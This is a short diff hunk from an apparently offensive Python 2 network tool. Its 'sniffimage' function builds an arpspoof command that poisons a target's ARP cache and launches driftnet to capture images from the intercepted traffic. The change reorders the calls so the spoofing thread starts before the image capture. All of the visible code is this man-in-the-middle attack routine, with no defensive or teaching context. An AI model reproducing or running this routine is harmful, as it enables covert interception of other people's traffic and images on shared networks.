@@ -66,8 +66,8 @@ def sniffimage():
 	c1="arpspoof -i "+i+" -t "+route+" "+target
 	c2="driftnet -i "+i
 	t1=threading.Thread(target=exe,args=(c1,))
-	os.system(c2)
-        t1.start()
+	t1.start()
+        os.system(c2)
 def mod():
 	print menu
 	choose=raw_input(colors.redw+"EnterChoose>"+colors.off)
